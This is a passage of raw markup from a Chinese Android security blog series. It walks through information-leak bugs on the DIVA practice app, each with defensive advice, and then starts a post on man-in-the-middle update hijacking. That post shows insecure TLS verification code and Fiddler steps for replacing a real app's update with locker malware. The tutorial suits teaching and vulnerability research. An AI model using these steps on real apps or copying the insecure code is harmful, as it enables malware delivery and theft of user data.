title=\"1.漏洞的安全场景\"></a>1.漏洞的安全场景</h3><p>信息泄露漏洞往往是指APP开发过程中一些不安全的开发问题导致敏感信息的泄露，那我们首先可以将敏感信息进行分类：产品敏感信息和用户敏感信息</p>\n<h4 id=\"（1）产品敏感信息\"><a href=\"#（1）产品敏感信息\" class=\"headerlink\" title=\"（1）产品敏感信息\"></a>（1）产品敏感信息</h4><p>产品敏感信息：登录密码、后台登录及数据库地址、服务器部署的绝对路径、内部ip、地址分配规则、网络拓扑、页面注释信息等</p>\n<h4 id=\"（2）用户敏感信息\"><a href=\"#（2）用户敏感信息\" class=\"headerlink\" title=\"（2）用户敏感信息\"></a>（2）用户敏感信息</h4><p>用户的个人隐私信息泄露导致被恶意人员利用获取不当信息，例如用户的密码，账户信息等等</p>\n<p>这些敏感信息泄露往往是由于信息未加密或存储位置不当造成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">代码中明文使用敏感信息，比如：服务器地址、数据库信息等</span><br><span class=\"line\">数据库中明文保存敏感信息，比如：账号、密码、银行卡等</span><br><span class=\"line\">SD卡中保存敏感信息或隐私信息,比如：聊天记录、通讯录等</span><br><span class=\"line\">日志打印敏感信息,比如：账号、密码</span><br><span class=\"line\">明文传输敏感信息</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-漏洞的分类\"><a href=\"#2-漏洞的分类\" class=\"headerlink\" title=\"2.漏洞的分类\"></a>2.漏洞的分类</h3><p>综上我们将Android中的信息泄露漏洞大致可分为：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/33.png\" alt=\"image-20220104172608948\"></p>\n<h2 id=\"四、信息泄露漏洞的原理分析和复现\"><a href=\"#四、信息泄露漏洞的原理分析和复现\" class=\"headerlink\" title=\"四、信息泄露漏洞的原理分析和复现\"></a>四、信息泄露漏洞的原理分析和复现</h2><p>本文为了简单演示各个漏洞的复现情况，将会使用样本DIVA.apk和一些实际漏洞的场景，样本将放到附件中</p>\n<h3 id=\"1-LogCat输出敏感信息漏洞\"><a href=\"#1-LogCat输出敏感信息漏洞\" class=\"headerlink\" title=\"1. LogCat输出敏感信息漏洞\"></a>1. LogCat输出敏感信息漏洞</h3><h4 id=\"（1）原理分析\"><a href=\"#（1）原理分析\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息</p>\n<p>一般来说，LogCat敏感信息输出漏洞包括：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">应用层Log敏感信息输出</span><br><span class=\"line\">应用层System.out.println敏感信息输出</span><br><span class=\"line\">系统bug异常导致Log输出</span><br><span class=\"line\">Native层敏感Log输出</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞案例——DIVA-apk例题1\"><a href=\"#（2）漏洞案例——DIVA-apk例题1\" class=\"headerlink\" title=\"（2）漏洞案例——DIVA.apk例题1\"></a>（2）漏洞案例——DIVA.apk例题1</h4><p>首先，我们安装样本DIVA.apk</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/6.png\" alt=\"image-20220104111529461\"></p>\n<p>然后我们打开例题1，并开启日志监控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb logcat |grep diva</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/7.png\" alt=\"image-20220104112058929\"></p>\n<p>我们在app表单总输入内容，check out后查看相关日志</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/8.png\" alt=\"image-20220104112212227\"></p>\n<p>我们就可以发现我们输入的密钥信息，然后我们根据日志信息，可以找到漏洞代码在LogActivity.class文件，我们查看相关代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/9.png\" alt=\"image-20220104112932530\"></p>\n<p>这里相关代码就是将敏感信息给泄露，当然我们真实的app中不会这么简单，但这确实一个很好的思路，比如我们对我们分析的app中的敏感信息的函数进行hook或者通过插桩日志的信息，我们就可以成功获得敏感信息了</p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>防护建议：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>Android Studio中配置ProGuard实现release版apk自动删除Log.d()/v()等代码</span><br><span class=\"line\"><span class=\"number\">2.</span>使用自定义LogCat类，上线前关闭LogCat开关</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">LG</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//是否开启debug</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"variable\">isDebug</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">e</span><span class=\"params\">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isDebug)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//Log.e</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">i</span><span class=\"params\">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isDebug)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//Log.i</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">w</span><span class=\"params\">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isDebug)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//Log.w</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">d</span><span class=\"params\">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isDebug)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//Log.d</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-硬编码问题漏洞\"><a href=\"#2-硬编码问题漏洞\" class=\"headerlink\" title=\"2.硬编码问题漏洞\"></a>2.硬编码问题漏洞</h3><h4 id=\"（1）原理分析-1\"><a href=\"#（1）原理分析-1\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>一些开发人员，在开发时使用硬编码的方式，导致存在一定的安全风险，硬编码一般是指将输出或输入的相关参数以常量的方式编写在源代码中，这样导致逆向分析人员可以直接通过分析源码就可以获得敏感信息</p>\n<h4 id=\"（2）漏洞案例——DIVA-apk例题2（java层）\"><a href=\"#（2）漏洞案例——DIVA-apk例题2（java层）\" class=\"headerlink\" title=\"（2）漏洞案例——DIVA.apk例题2（java层）\"></a>（2）漏洞案例——DIVA.apk例题2（java层）</h4><p>我们打开样本app的例题2</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/10.png\" alt=\"image-20220104143848066\"></p>\n<p>我们分析对应app相关的逆向代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/11.png\" alt=\"image-20220104143950575\"></p>\n<p>我们可以发现相应的敏感信息被直接用来判断，采用硬编码的方式，我们直接将密钥输入，发现可以成功破译</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/12.png\" alt=\"image-20220104144243905\"></p>\n<h4 id=\"（3）漏洞案例——DIVA-apk例题12（so层）\"><a href=\"#（3）漏洞案例——DIVA-apk例题12（so层）\" class=\"headerlink\" title=\"（3）漏洞案例——DIVA.apk例题12（so层）\"></a>（3）漏洞案例——DIVA.apk例题12（so层）</h4><p>我们打开例题12</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/28.png\" alt=\"image-20220104170422773\"></p>\n<p>我们分析对应的代码段</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/29.png\" alt=\"image-20220104170535933\"></p>\n<p>说明key被保存在libsoName.so库中，我们将文件打开</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/30.png\" alt=\"image-20220104170746729\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/31.png\" alt=\"image-20220104171214316\"></p>\n<p>经过分析，我们确定这就是我们的键值，我们输入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/32.png\" alt=\"image-20220104171352572\"></p>\n<p>说明key放在so层中也是不安全的</p>\n<p>密钥硬编码案例：</p>\n<p>下面为乌云平台一些APP漏洞案例，详细可做参考：</p>\n<p><a href=\"436b34f44b9f95fd3aa8667f1ad451b16a683c5957c8d733b3809de3444b7c6fffae9f78c9c65e6f292dd695bd96daa0c3f153ebdaeb4f1b582e5c13e28f97c3601018d9e8a589033217ff27785e473dbcc50607f5530dd0a63dd6f512327a46effe31c0ed8b01752287563eebc03bf2495aa785bf000246363bd83dc65459799e5b2af9e74fcc8cb84b8c8b55ba087b6c184ae39c9f8a03cef3622956a4767be83bc3c2f93d8931185a3a9c47e527aed5b7fe1c570c1cc866fc201b62a8c5ba0ca75d7a1d0fd6dd53c3b3d342a74ce414334ae0d1bb980becf489b072cfaaaf00f6d3ac37f973c7970274827c26ecbb177cc4fa5d38d9ece06ab2b5a4bf7147\">密钥硬编码</a></p>\n<h4 id=\"（4）安全防护\"><a href=\"#（4）安全防护\" class=\"headerlink\" title=\"（4）安全防护\"></a>（4）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>对明文传输的密钥进行加密传输</span><br><span class=\"line\"><span class=\"number\">2.</span>采用变量的方式去读取，不采用硬解码的方式</span><br><span class=\"line\"><span class=\"number\">3.</span>对java层中进行混淆，对so层中进行ollvm控制流混淆</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Shared-Preference全局可读写漏洞\"><a href=\"#3-Shared-Preference全局可读写漏洞\" class=\"headerlink\" title=\"3. Shared Preference全局可读写漏洞\"></a>3. Shared Preference全局可读写漏洞</h3><h4 id=\"（1）原理分析-2\"><a href=\"#（1）原理分析-2\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>Shared Preferences存储安全风险在于：开发者在创建文件时没有正确的选择合适的创建模式（MODE_PRIVATE、MODE_WOELD_READABLE以及MODE_WORLD_WRITEABBLE）进行权限控制，导致将一些用户信息、密码等敏感信息存储在Shared Preferences文件中，攻击者可以通过root来查看敏感信息</p>\n<h4 id=\"（2）漏洞案例——DIVA-apk例题3\"><a href=\"#（2）漏洞案例——DIVA-apk例题3\" class=\"headerlink\" title=\"（2）漏洞案例——DIVA.apk例题3\"></a>（2）漏洞案例——DIVA.apk例题3</h4><p>我们进入例题3：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/13.png\" alt=\"image-20220104145137669\"></p>\n<p>我们分析对应的逆向代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/14.png\" alt=\"image-20220104145233158\"></p>\n<p>经过我们前文的分析，很明显这里采用的是SharedPreference的存储方式</p>\n<p>我们输入相关的账号和密码，然后我们可以进入shared_prefs查看相关的文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/15.png\" alt=\"image-20220104145701360\"></p>\n<h4 id=\"（3）安全防护-1\"><a href=\"#（3）安全防护-1\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>防护意见：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>避免使用MODEWORLDWRITEABLE和MODEWORLDREADABLE模式创建进程间通信的文件，此处即为Shared Preferences</span><br><span class=\"line\"><span class=\"number\">2.</span>不要将密码等敏感信息存储在Shared Preferences等内部存储中</span><br><span class=\"line\"><span class=\"number\">3.</span>避免滥用<span class=\"string\">&quot;Android:sharedUserId&quot;</span>属性</span><br><span class=\"line\"><span class=\"number\">4.</span>不要在使用“android:sharedUserId”属性的同时，对应用使用测试签名，否则其他应用拥有“android:sharedUserId<span class=\"string\">&quot;属性值和测试签名是，将会访问到内部存储文件数据</span></span><br><span class=\"line\"><span class=\"string\">5.使用Secure Preferences第三方加固库进行存储</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-数据库存储漏洞\"><a href=\"#4-数据库存储漏洞\" class=\"headerlink\" title=\"4.数据库存储漏洞\"></a>4.数据库存储漏洞</h3><h4 id=\"（1）原理分析-3\"><a href=\"#（1）原理分析-3\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>Database配置模式安全风险源于：</p>\n<p>开发者在创建数据库（Database）时没有正确的选取合适的创建模式（MODE_PRIVATE、MODE_WORLD_READABLE）进行权限控制，从而导致数据库（Database）内容被恶意读写，造成账户密码、身份信息、以及其他敏感信息泄露，甚至攻击者进一步实施恶意攻击</p>\n<h4 id=\"（2）漏洞案例——DIVA-apk例题4\"><a href=\"#（2）漏洞案例——DIVA-apk例题4\" class=\"headerlink\" title=\"（2）漏洞案例——DIVA.apk例题4\"></a>（2）漏洞案例——DIVA.apk例题4</h4><p>我们进入例题4</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/16.png\" alt=\"image-20220104154306093\"></p>\n<p>然后我们输入相关信息并保存</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/17.png\" alt=\"image-20220104154526963\"></p>\n<p>我们将数据库给拉取下来，然后使用SQLite查看</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/18.png\" alt=\"image-20220104155824459\"></p>\n<p>我们就可以发现敏感信息，我们可以分析对应的代码段</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/19.png\" alt=\"image-20220104155937819\"></p>\n<p>我们上文的存取数据库名也是从对应代码出找到</p>\n<h4 id=\"（3）安全防护-2\"><a href=\"#（3）安全防护-2\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>防护建议：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>敏感信息在进行数据库存储时，对数据进行加密存储，并且应该避免弱加密或者是不安全的加密方式</span><br><span class=\"line\"><span class=\"number\">2.</span>对于敏感的数据库文件，不得使用MODE_WORLD_READABLE或者是MODE_WORLD_WRITEABLE进行创建</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-临时文件或SD卡漏洞\"><a href=\"#5-临时文件或SD卡漏洞\" class=\"headerlink\" title=\"5.临时文件或SD卡漏洞\"></a>5.临时文件或SD卡漏洞</h3><h4 id=\"（1）原理分析-4\"><a href=\"#（1）原理分析-4\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>经过上文我们讲述的文件存储，现在的手机很多的公共目录都是自身自带的存储空间，Android系统的文件一般都存储在sdCard和应用的私有目录下，任何在Android Manifest中声明读写sdcard权限的应用都可以对sdcard进行读写。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--在SDcard中创建与删除文件权限--&gt;</span><br><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span></span><br><span class=\"line\">        tools:ignore=<span class=\"string\">&quot;ProtectedPermissions&quot;</span> /&gt;</span><br><span class=\"line\">&lt;!--往SDCard写入数据权限--&gt;</span><br><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞案例——DIVA-apk例题5与例题6\"><a href=\"#（2）漏洞案例——DIVA-apk例题5与例题6\" class=\"headerlink\" title=\"（2）漏洞案例——DIVA.apk例题5与例题6\"></a>（2）漏洞案例——DIVA.apk例题5与例题6</h4><p>我们打开例题5</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/20.png\" alt=\"image-20220104161709796\"></p>\n<p>我们分析对应部分的相关代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/21.png\" alt=\"image-20220104161841048\"></p>\n<p>根据代码，我们知道这里采用文件存储的方式，所以我们直接找到该文件，查看即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/22.png\" alt=\"image-20220104162116624\"></p>\n<p>同理，我们打开例题6，查看对应的代码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/23.png\" alt=\"image-20220104162259850\"></p>\n<p>我们可以发现是存储在sd卡下，然后我们输入相关信息，之后直接去sdcard下查找，这里我们需要注意，需要给应用存取权限，否则是保存不了的</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/24.png\" alt=\"image-20220104164309655\"></p>\n<h4 id=\"（3）安全防护-3\"><a href=\"#（3）安全防护-3\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>防护意见：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>不要将敏感信息存入本地固定的文件中，哪怕是加密存储也可能面临暴力破解的风险</span><br><span class=\"line\"><span class=\"number\">2.</span>对于保存信息的代码段进行混淆加密，使其难以被逆向人员简单分析获取</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-http明文传输漏洞\"><a href=\"#6-http明文传输漏洞\" class=\"headerlink\" title=\"6. http明文传输漏洞\"></a>6. http明文传输漏洞</h3><h4 id=\"（1）漏洞原理\"><a href=\"#（1）漏洞原理\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>开发人员在开发时对网络连接的一些敏感数据往往采用http明文传输，这样就十分容易导致恶意攻击者通过一些抓包工具进行捕获，获取敏感信息，导致信息泄露的风险</p>\n<h4 id=\"（2）漏洞案例——XX音乐存在任意文件下载漏洞\"><a href=\"#（2）漏洞案例——XX音乐存在任意文件下载漏洞\" class=\"headerlink\" title=\"（2）漏洞案例——XX音乐存在任意文件下载漏洞\"></a>（2）漏洞案例——XX音乐存在任意文件下载漏洞</h4><p>这段时间我查看了一下国内主流的音乐软件平台，发现很多音乐软件都存在http明文传输的问题，这样势必会导致升级劫持、信息泄露、任意文件下载等等漏洞，这里我们列举一个有http明文泄露导致的任意文件下载问题</p>\n<p>首先我们随便选择几首需要VIP下载的歌曲</p>\n<p>等他</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/25.png\" alt=\"image-20220104164309655\"></p>\n<p>我们发现这些音乐都需要开通VIP才能下载</p>\n<p>接下来我们用抓包软件抓取</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/27.png\" alt=\"image-20220104164309655\"></p>\n<p>我们发现了音乐的url，我们直接访问，发现可以直接下载</p>\n<p>还有一些http明文传输漏洞导致任意登录，一些APP也会把登录成功的Cookie保存在本地，那么只要找到相关文件复制下来这个Cookie，就可以任意登录了。</p>\n<h4 id=\"（3）安全防护-4\"><a href=\"#（3）安全防护-4\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>防护建议：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>采用https加密传输</span><br><span class=\"line\"><span class=\"number\">2.</span>敏感信息使用http传输，那么对敏感信息进行加密，并且使用非对称加密，或者公认的强加密算法</span><br><span class=\"line\"><span class=\"number\">3.</span>对以下字段进行加密处理：密码、手机号、快捷支付手机号、Email、身份证、银行卡、CVV码、有效期等</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文对Android App中信息泄露漏洞的常见形式做了一个基本的讲述，当然实际过程中很多APP的信息泄露漏洞可能要比这个复杂，这里只是初步的为大家介绍一下信息泄露漏洞的基础知识，本文的样例我会上传到github上，这里放一个传送门：</p>\n<p><a href=\"https://github.com/guoxuaa/Android-Vulnerability-Mining\">github地址</a></p>\n<h2 id=\"六、参考文献\"><a href=\"#六、参考文献\" class=\"headerlink\" title=\"六、参考文献\"></a>六、参考文献</h2><p>文件存储：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://juejin.cn/post/6844903778227847182#heading-10</span><br><span class=\"line\">https://juejin.cn/post/6844904013515718664#heading-6</span><br></pre></td></tr></table></figure>\n\n<p>其他存储：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.jianshu.com/p/536ca489a7f4</span><br><span class=\"line\">https://cloud.tencent.com/developer/article/1045171</span><br></pre></td></tr></table></figure>\n\n<p>网络存储：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.cnblogs.com/doodle777/p/4937594.html</span><br><span class=\"line\">https://blog.csdn.net/weixin_43689040/article/details/103761411</span><br></pre></td></tr></table></figure>\n\n<p>漏洞挖掘参考：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.anquanke.com/post/id/84603</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.anquanke.com/post/id/86057</span></span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（16）——通信漏洞的案例实操","url":"/2023/02/14/bug0016/","content":"<h2 id=\"一、漏洞介绍\"><a href=\"#一、漏洞介绍\" class=\"headerlink\" title=\"一、漏洞介绍\"></a>一、漏洞介绍</h2><span id=\"more\"></span>\t\t\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">APP升级劫持漏洞是最常见的通用型逻辑缺陷漏洞，攻击者一般通过劫持APP升级的响应，通过伪造和篡改的方式来实现中间人攻击，从而向应用中注入恶意程序</span><br><span class=\"line\">CNVD-2021-40179和CNVD-2021-45684便是采用中间人劫持攻击，来实现APP的恶意劫持替换</span><br><span class=\"line\">现在市面上常用的APP,基本采用http明文传输——&gt;https加密传输——&gt;http/https+hash校验三种方式，我们依次对酷我音乐、酷狗音乐、学而思网校等主流APP做漏洞测试，来描述中间人攻击的具体实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、原理解析\"><a href=\"#二、原理解析\" class=\"headerlink\" title=\"二、原理解析\"></a>二、原理解析</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">中间人攻击（MITM）是指攻击者与通讯的两端分别独立的联系，并交换其所收到的数据，使得通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都会被攻击者完全控制</span><br><span class=\"line\">在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/0.png\" alt=\"avatar\"></p>\n<p>客户端不验证服务器是否可信，即checkServerTrusted()方法为空</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">public void checkClientTrusted(X509Certificate[] chain, String authType)&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不检查站点域名与站点证书的域名是否匹配</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HostnameVerifier hv = new HostnameVerifier()&#123;</span><br><span class=\"line\">@Override</span><br><span class=\"line\">public boolean verify(String hostname,SSLSession session)&#123;</span><br><span class=\"line\">return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接收任意域名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SSLSocketFactory sf;</span><br><span class=\"line\">......</span><br><span class=\"line\">sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"二、实验准备\"><a href=\"#二、实验准备\" class=\"headerlink\" title=\"二、实验准备\"></a>二、实验准备</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Fiddler</span><br><span class=\"line\">夜神模拟器（有条件的最好用真机）</span><br><span class=\"line\">HFS文件服务器</span><br><span class=\"line\">Stunnel</span><br><span class=\"line\">恶意锁机样本——Wifikillpro.apk</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、实验步骤\"><a href=\"#三、实验步骤\" class=\"headerlink\" title=\"三、实验步骤\"></a>三、实验步骤</h2><h3 id=\"1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）\"><a href=\"#1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）\" class=\"headerlink\" title=\"1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）\"></a>1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）</h3><p><strong>（1）Fiddler环境配置</strong></p>\n<p>​\t\t参考链接：<a href=\"https://bbs.pediy.com/thread-268445.htm\">Fiddler环境配置</a></p>\n<p><strong>（2）安装酷我音乐，并抓取响应请求</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/1.png\" alt=\"avatar\"></p>\n<p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/2.png\" alt=\"avatar\"></p>\n<p>我们进一步分析报文的详细信息：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/3.png\" alt=\"avatar\"></p>\n<p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p>\n<p><strong>（3）劫持攻击</strong></p>\n<p>​\t\t1）下劫持响应请求断点，可以让我们在劫持特定的请求响应</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里我总结集中常见的指令：</span><br><span class=\"line\">bpu+URL:    中断特定URL的全部session请求报文</span><br><span class=\"line\">bpafter+URL:中断特定URL的全部session响应报文</span><br><span class=\"line\">bps+URL:    中断 HTTP 响应状态的指定URL的全部session响应</span><br><span class=\"line\">bpv+URL:    中断指定请求方式的全部 session 响应</span><br><span class=\"line\">bpm+URL:    中断指定请求方式的全部 session 响应。等同于bpv</span><br><span class=\"line\">bpu/bpafter/bps/bpv/bpm  停止断点</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/4.png\" alt=\"avatar\"></p>\n<p>​\t\t2）通过HFS文件管理服务器，来模拟请求的服务器</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/5.png\" alt=\"avatar\"></p>\n<p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p>\n<p>​\t\t3）重新安装，开始升级</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/6.png\" alt=\"avatar\"></p>\n<p>此时，我们将下载请求给劫持下来了，我们只需要更改域名为我们ip地址，再响应就可以下载我们的锁机程序了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/7.png\" alt=\"avatar\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/8.png\" alt=\"avatar\"></p>\n<p>此时我们发现我们的锁机样本被用户成功的下载，用户在未知情况下打开，便被锁机了</p>\n<h3 id=\"2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）\"><a href=\"#2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）\" class=\"headerlink\" title=\"2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）\"></a>2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）</h3><p><strong>(1) 安装酷狗音乐，抓取响应请求</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/10.png\" alt=\"avatar\"></p>\n<figure 